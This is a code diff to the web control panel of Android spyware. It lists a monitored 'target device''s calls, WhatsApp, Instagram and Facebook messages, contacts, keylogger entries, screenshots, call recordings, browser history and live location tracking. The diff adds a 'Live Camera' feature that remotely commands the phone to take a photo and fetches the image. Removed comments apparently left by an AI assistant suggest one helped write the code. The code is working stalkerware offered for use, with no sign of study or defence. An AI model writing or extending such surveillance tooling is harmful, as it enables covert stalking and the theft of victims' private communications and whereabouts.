@@ -76,10 +76,7 @@
       border: 1px solid #0f0;
       backdrop-filter: blur(5px);
     }
-    .top-bar h2 {
-      color: #0f0;
-      text-shadow: 0 0 3px #0f0;
-    }
+    .top-bar h2 { color: #0f0; text-shadow: 0 0 3px #0f0; }
     .dashboard-card {
       background: rgba(0, 0, 0, 0.75);
       border-radius: 24px;
@@ -173,6 +170,13 @@
       color: black;
       box-shadow: 0 0 8px #0f0;
     }
+    .camera-preview {
+      max-width: 100%;
+      max-height: 500px;
+      border: 1px solid #0f0;
+      margin-top: 20px;
+      display: none;
+    }
     @media (max-width: 768px) { .sidebar { width: 70px; } .sidebar a span { display: none; } .main-content { margin-left: 70px; } }
   </style>
 </head>
@@ -198,6 +202,7 @@
       <li><a href="#" data-tab="geofence"><i class="fas fa-draw-polygon"></i><span> Geofence</span></a></li>
       <li><a href="#" data-tab="appusage"><i class="fas fa-chart-simple"></i><span> App Usage</span></a></li>
       <li><a href="#" data-tab="export"><i class="fas fa-download"></i><span> Export Data</span></a></li>
+      <li><a href="#" data-tab="livecamera"><i class="fas fa-video"></i><span> Live Camera</span></a></li>
     </ul>
   </div>
   <div class="main-content">
@@ -224,7 +229,7 @@
         <div class="card-title">Monitored Devices</div>
         <div class="table-responsive">
           <table id="devicesTable">
-            <thead>    <tr><th>Device Name</th><th>Model</th><th>Android Version</th><th>Status</th><th>Last Seen</th></tr> </thead>
+            <thead> <tr><th>Device Name</th><th>Model</th><th>Android Version</th><th>Status</th><th>Last Seen</th></tr> </thead>
             <tbody></tbody>
           </table>
         </div>
@@ -245,8 +250,10 @@
     <div id="social-instagram" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-instagram"></i> Instagram Messages</div><div class="table-responsive"><table class="social-table" data-app="instagram"><thead> <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
     <div id="social-facebook" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-facebook"></i> Facebook Messages</div><div class="table-responsive"><table class="social-table" data-app="facebook"><thead> <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
 
-    <!-- Other tabs -->
+    <!-- Contacts Tab -->
     <div id="contacts" class="tab-content"><div class="dashboard-card"><div class="card-title">Contacts</div><div class="table-responsive"><table id="contactsTable"><thead> <tr><th>Name</th><th>Number</th><th>Email</th></tr> </thead><tbody></tbody></table></div></div></div>
+
+    <!-- Locations Tab -->
     <div id="locations" class="tab-content">
       <div class="dashboard-card">
         <div class="card-title">Location History</div>
@@ -263,13 +270,42 @@
         </div>
       </div>
     </div>
+
+    <!-- Browser Tab -->
     <div id="browser" class="tab-content"><div class="dashboard-card"><div class="card-title">Browser History</div><div class="table-responsive"><table id="browserTable"><thead> <tr><th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th></tr> </thead><tbody></tbody></table></div></div></div>
+
+    <!-- Screenshots Tab -->
     <div id="screenshots" class="tab-content"><div class="dashboard-card"><div class="card-title">Screenshots</div><div id="screenshotsGrid" style="display: flex; flex-wrap: wrap; gap: 15px;"></div></div></div>
+
+    <!-- Keylogger Tab -->
     <div id="keylogs" class="tab-content"><div class="dashboard-card"><div class="card-title">Keylogger Entries</div><div class="table-responsive"><table id="keylogsTable"><thead> <tr><th>App</th><th>Text</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+
+    <!-- Keyword Alerts Tab -->
     <div id="keywords" class="tab-content"><div class="dashboard-card"><div class="card-title">Keyword Alerts</div><div class="table-responsive"><table id="keywordsTable"><thead> <tr><th>Keyword</th><th>Matched Text</th><th>App</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+
+    <!-- Geofence Tab -->
     <div id="geofence" class="tab-content"><div class="dashboard-card"><div class="card-title">Geofence Events</div><div class="table-responsive"><table id="geofenceTable"><thead> <tr><th>Fence Name</th><th>Event</th><th>Center</th><th>Radius</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+
+    <!-- App Usage Tab -->
     <div id="appusage" class="tab-content"><div class="dashboard-card"><div class="card-title">App Usage</div><div class="table-responsive"><table id="appusageTable"><thead> <tr><th>App Name</th><th>Package</th><th>Foreground Time (sec)</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+
+    <!-- Export Tab -->
     <div id="export" class="tab-content"><div class="dashboard-card"><div class="card-title">Export Data</div><button id="exportBtn" class="btn-primary">Export All as CSV</button></div></div>
+
+    <!-- Live Camera Tab -->
+    <div id="livecamera" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Live Camera</div>
+        <div style="margin-bottom: 20px;">
+          <select id="cameraDeviceSelect" class="btn-outline" style="margin-right: 10px;"></select>
+          <button id="takePhotoBtn" class="btn-primary">📸 Take Photo</button>
+        </div>
+        <div id="cameraImageContainer" style="text-align: center;">
+          <img id="latestPhoto" class="camera-preview">
+          <p id="cameraMessage">Click "Take Photo" to capture from the target device.</p>
+        </div>
+      </div>
+    </div>
   </div>
 
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -347,6 +383,7 @@
       if (data.success) document.getElementById('userName').innerText = data.user.name;
     }
 
+    // ----- DASHBOARD STATS -----
     async function loadDashboard() {
       const stats = await fetchAPI('/data/stats');
       if (stats.success) {
@@ -378,6 +415,7 @@
       }
     }
 
+    // ----- DEVICES -----
     async function loadDevices() {
       const res = await fetchAPI('/data/devices');
       if (res.success) {
@@ -402,6 +440,7 @@
       }
     }
 
+    // ----- CALLS -----
     async function loadCalls() {
       const res = await fetchAPI('/data/calls');
       if (res.success) {
@@ -414,6 +453,7 @@
       }
     }
 
+    // ----- MESSAGES (cached) -----
     let allMessages = [];
     async function loadMessages(appFilter = null) {
       if (allMessages.length === 0) {
@@ -445,6 +485,7 @@
       });
     }
 
+    // ----- CONTACTS -----
     async function loadContacts() {
       const res = await fetchAPI('/data/contacts');
       if (res.success) {
@@ -457,7 +498,7 @@
       }
     }
 
-    // ---------- LOCATION MAP WITH LIVE TRACKING ----------
+    // ----- LOCATIONS (map + live tracking) -----
     let map;
     let liveInterval = null;
     let latestMarker = null;
@@ -472,32 +513,21 @@
           map = L.map('map').setView([res.data[0].lat, res.data[0].lng], 12);
           L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
         } else {
-          // Clear all markers except the latest one (we'll re-add)
-          map.eachLayer(layer => {
-            if (layer instanceof L.Marker) map.removeLayer(layer);
-          });
+          map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
           latestMarker = null;
         }
-        // Add all points (history)
         res.data.forEach(loc => {
           const row = `<tr><td>${loc.address || ''}</td><td>${loc.lat}, ${loc.lng}</td><td>${new Date(loc.timestamp).toLocaleString()}</td></tr>`;
           tbody.insertAdjacentHTML('beforeend', row);
           const marker = L.marker([loc.lat, loc.lng]).addTo(map).bindPopup(loc.address || 'Location');
-          // Keep track of the latest marker
           if (!latestMarker || new Date(loc.timestamp) > new Date(latestMarker.options.timestamp)) {
             if (latestMarker) map.removeLayer(latestMarker);
             latestMarker = marker;
             latestMarker.options.timestamp = loc.timestamp;
           }
         });
-        if (res.data.length > 1) {
-          const bounds = res.data.map(p => [p.lat, p.lng]);
-          map.fitBounds(bounds);
-        }
-        // Style the latest marker differently
-        if (latestMarker) {
-          latestMarker.setIcon(L.divIcon({ className: 'latest-marker', html: '📍', iconSize: [30, 30] }));
-        }
+        if (res.data.length > 1) map.fitBounds(res.data.map(p => [p.lat, p.lng]));
+        if (latestMarker) latestMarker.setIcon(L.divIcon({ className: 'latest-marker', html: '📍', iconSize: [30, 30] }));
       } else {
         if (map) map.remove();
         document.getElementById('map').innerHTML = '<p>No location data available.</p>';
@@ -509,7 +539,6 @@
       if (res.success && res.data.length) {
         const latest = res.data[0];
         map.setView([latest.lat, latest.lng], 15);
-        // Update the latest marker (if exists)
         if (latestMarker) map.removeLayer(latestMarker);
         latestMarker = L.marker([latest.lat, latest.lng]).addTo(map).bindPopup(latest.address || 'Latest Location').openPopup();
         latestMarker.options.timestamp = latest.timestamp;
@@ -524,52 +553,34 @@
         latestMarker = L.marker([latest.lat, latest.lng]).addTo(map).bindPopup(latest.address || 'Latest Location').openPopup();
         latestMarker.options.timestamp = latest.timestamp;
         map.setView([latest.lat, latest.lng], map.getZoom());
-        // Optionally refresh the table? Could be done but we skip to avoid heavy reload
       }
     }
 
     function startLiveTracking() {
       if (liveInterval) clearInterval(liveInterval);
-      liveInterval = setInterval(updateLiveLocation, 10000); // every 10 seconds
+      liveInterval = setInterval(updateLiveLocation, 10000);
       liveActive = true;
-      document.getElementById('liveTrackingBtn').innerHTML = '🔴 Live Tracking ON';
-      document.getElementById('liveTrackingBtn').style.background = '#0f0';
-      document.getElementById('liveTrackingBtn').style.color = 'black';
+      const btn = document.getElementById('liveTrackingBtn');
+      btn.innerHTML = '🔴 Live Tracking ON';
+      btn.style.background = '#0f0';
+      btn.style.color = 'black';
     }
 
     function stopLiveTracking() {
-      if (liveInterval) {
-        clearInterval(liveInterval);
-        liveInterval = null;
-      }
+      if (liveInterval) clearInterval(liveInterval);
       liveActive = false;
-      document.getElementById('liveTrackingBtn').innerHTML = '🔴 Live Tracking OFF';
-      document.getElementById('liveTrackingBtn').style.background = '';
-      document.getElementById('liveTrackingBtn').style.color = '';
+      const btn = document.getElementById('liveTrackingBtn');
+      btn.innerHTML = '🔴 Live Tracking OFF';
+      btn.style.background = '';
+      btn.style.color = '';
     }
 
     function toggleLiveTracking() {
-      if (liveActive) {
-        stopLiveTracking();
-      } else {
-        startLiveTracking();
-      }
+      if (liveActive) stopLiveTracking();
+      else startLiveTracking();
     }
 
-    // Other functions (loadBrowser, loadScreenshots, etc.) remain the same as before.
-    // For brevity, they are omitted here but must be included in the final file.
-    // (The user already has them in their current dashboard.html – we just keep them.)
-    // I will include the rest of the original functions to ensure completeness.
-
-    // [Placeholder for the rest of the functions – in the final answer I'll provide the full file]
-    // For now, I'll add the remaining functions that were present in the original dashboard.
-    // To avoid duplication, I'll copy them from the original dashboard provided earlier.
-    // (The user had them all; we just need to include them.)
-
-    // ... (all the other functions like loadBrowser, loadScreenshots, loadKeylogs, etc. remain unchanged)
-    // I'll paste the remaining code from the original dashboard to keep the file complete.
-
-    // ========== ORIGINAL FUNCTIONS (unchanged) ==========
+    // ----- BROWSER HISTORY -----
     async function loadBrowser() {
       const res = await fetchAPI('/data/browser');
       if (res.success) {
@@ -582,6 +593,7 @@
       }
     }
 
+    // ----- SCREENSHOTS -----
     async function loadScreenshots() {
       const res = await fetchAPI('/data/screenshots');
       if (res.success) {
@@ -599,6 +611,7 @@
       }
     }
 
+    // ----- KEYLOGS -----
     async function loadKeylogs() {
       const res = await fetchAPI('/data/keylogs');
       if (res.success) {
@@ -611,6 +624,7 @@
       }
     }
 
+    // ----- KEYWORD ALERTS -----
     async function loadKeywords() {
       const res = await fetchAPI('/data/keyword-alerts');
       if (res.success) {
@@ -623,6 +637,7 @@
       }
     }
 
+    // ----- GEOFENCE -----
     async function loadGeofence() {
       const res = await fetchAPI('/data/geofence');
       if (res.success) {
@@ -635,6 +650,7 @@
       }
     }
 
+    // ----- APP USAGE -----
     async function loadAppUsage() {
       const res = await fetchAPI('/data/app-usage');
       if (res.success) {
@@ -647,6 +663,7 @@
       }
     }
 
+    // ----- CALL RECORDINGS -----
     async function loadRecordings() {
       const res = await fetchAPI('/data/call-recordings');
       if (res.success && res.data.length) {
@@ -669,6 +686,7 @@
       }
     }
 
+    // ----- EXPORT -----
     async function exportData() {
       playBeep();
       const endpoints = ['calls', 'messages', 'contacts', 'locations', 'browser', 'keylogs', 'keyword-alerts', 'geofence', 'app-usage'];
@@ -698,7 +716,71 @@
       URL.revokeObjectURL(url);
     }
 
-    // Tab switching
+    // ----- LIVE CAMERA -----
+    let photoPollingInterval = null;
+
+    async function loadCameraDevices() {
+      const res = await fetchAPI('/data/devices');
+      if (res.success) {
+        const select = document.getElementById('cameraDeviceSelect');
+        select.innerHTML = '';
+        res.data.forEach(device => {
+          const option = document.createElement('option');
+          option.value = device.deviceId;
+          option.textContent = device.deviceName || device.deviceModel || 'Unknown';
+          select.appendChild(option);
+        });
+      }
+    }
+
+    async function takePhoto() {
+      const select = document.getElementById('cameraDeviceSelect');
+      const deviceId = select.value;
+      if (!deviceId) {
+        alert('No device selected');
+        return;
+      }
+      const res = await fetch(`${API_BASE}/client/command`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({ deviceId, command: 'take_photo' })
+      });
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById('cameraMessage').innerText = 'Command sent. Waiting for photo...';
+        startPhotoPolling();
+      } else {
+        alert('Failed to send command');
+      }
+    }
+
+    function startPhotoPolling() {
+      if (photoPollingInterval) clearInterval(photoPollingInterval);
+      photoPollingInterval = setInterval(async () => {
+        const res = await fetchAPI('/data/photos');
+        if (res.success && res.data.length > 0) {
+          const latest = res.data[0];
+          const img = document.getElementById('latestPhoto');
+          img.src = `data:image/jpeg;base64,${latest.imageBase64}`;
+          img.style.display = 'block';
+          document.getElementById('cameraMessage').innerText = 'Latest photo from device:';
+          clearInterval(photoPollingInterval);
+          photoPollingInterval = null;
+        }
+      }, 2000);
+      setTimeout(() => {
+        if (photoPollingInterval) {
+          clearInterval(photoPollingInterval);
+          photoPollingInterval = null;
+          document.getElementById('cameraMessage').innerText = 'No photo received. Try again.';
+        }
+      }, 30000);
+    }
+
+    // ----- TAB SWITCHING -----
     const tabs = document.querySelectorAll('.sidebar a');
     const contents = document.querySelectorAll('.tab-content');
     tabs.forEach(link => {
@@ -709,10 +791,7 @@
         document.getElementById(tabId).classList.add('active');
         tabs.forEach(t => t.classList.remove('active'));
         link.classList.add('active');
-        // If leaving the Locations tab, stop live tracking
-        if (tabId !== 'locations' && liveActive) {
-          stopLiveTracking();
-        }
+        if (tabId !== 'locations' && liveActive) stopLiveTracking();
         switch(tabId) {
           case 'dashboard': loadDashboard(); break;
           case 'devices': loadDevices(); break;
@@ -731,6 +810,7 @@
           case 'geofence': loadGeofence(); break;
           case 'appusage': loadAppUsage(); break;
           case 'export': document.getElementById('exportBtn').onclick = exportData; break;
+          case 'livecamera': loadCameraDevices(); break;
         }
       });
     });
@@ -740,6 +820,9 @@
       if (map) centerOnLatest();
     });
     document.getElementById('liveTrackingBtn').addEventListener('click', toggleLiveTracking);
+
+    // Take photo button
+    document.getElementById('takePhotoBtn').addEventListener('click', takePhoto);
 
     // Logout with sound
     document.getElementById('logoutBtn').addEventListener('click', () => {
